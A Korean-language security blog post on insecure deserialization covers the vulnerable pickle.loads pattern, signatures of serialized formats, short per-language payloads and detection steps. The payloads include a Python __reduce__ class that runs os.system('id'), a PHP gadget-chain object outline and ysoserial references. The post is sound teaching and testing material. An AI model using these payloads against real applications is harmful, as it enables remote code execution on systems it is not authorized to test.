---
title: "안전하지 않은 역직렬화 (Insecure Deserialization)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, Deserialization]
tags: [deserialization, gadget-chain, web]
description: "신뢰할 수 없는 직렬화 데이터를 복원할 때 객체 생성·매직 메서드 체인으로 코드가 실행되는 역직렬화 취약점의 개념과, 언어별 페이로드·탐지 구문을 정리합니다."
mermaid: true
---

> 역직렬화는 바이트열을 **객체로 되살리는** 과정이다. 그 바이트가 공격자 통제라면, 복원 과정에서 자동 호출되는 매직 메서드와 라이브러리 "가젯"을 엮어 코드 실행·파일 접근까지 이어진다.

## 개념

직렬화 데이터는 타입·필드·때로는 클래스 정보를 담는다. 역직렬화기가 임의 클래스를 복원하고, 그 과정에서 생성자·매직 메서드(`__wakeup`, `__destruct`, `readObject`, `__reduce__`)가 자동 실행되면, 공격자는 이미 설치된 라이브러리의 메서드들을 연결(gadget chain)해 원하는 동작을 만든다.

```python
pickle.loads(base64.b64decode(cookie))   # 신뢰 못 할 쿠키 → __reduce__ 로 실행
```

원인은 **신뢰할 수 없는 데이터를 역직렬화하는 것** 자체다. 쿠키·토큰·캐시·메시지 큐·업로드 파일에 직렬화 객체가 들어오는 지점이 발생처다.

## 공격·우회 구문

허가된 범위에서만. 먼저 직렬화 형식을 식별한다.

### 형식 식별

```
Java:  rO0AB... (Base64) / 매직 바이트 AC ED 00 05
PHP:   O:4:"User":... / a:2:{...}
Python pickle:  \x80\x04... / Base64 gASV...
.NET:  AAEAAAD///// (BinaryFormatter)
```

### 언어별 페이로드

```
Python: class E: def __reduce__(self): return (os.system,("id",))
        → pickle.dumps(E()) 를 입력 지점에
PHP:    O:4:"User":2:{s:4:"name";s:2:"id";...}  매직 메서드(__wakeup/__destruct) 체인
        POP gadget: 설치된 클래스의 메서드 연결
Java:   ysoserial 로 가젯 체인 생성(CommonsCollections 등) — 허가된 테스트만
.NET:   ysoserial.net (TypeConfuseDelegate 등)
```

### 탐지·확인

```
입력을 역직렬화 형식으로 바꿔 보내 500/예외·지연 관찰
무해한 가젯(시간 지연·OAST 콜백)으로 실행 여부만 증명
코드: unserialize/pickle.loads/readObject/BinaryFormatter 호출에 외부 입력이 닿는지,
      허용 클래스 목록(allowlist)이 있는지
```

## 참고 자료

- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
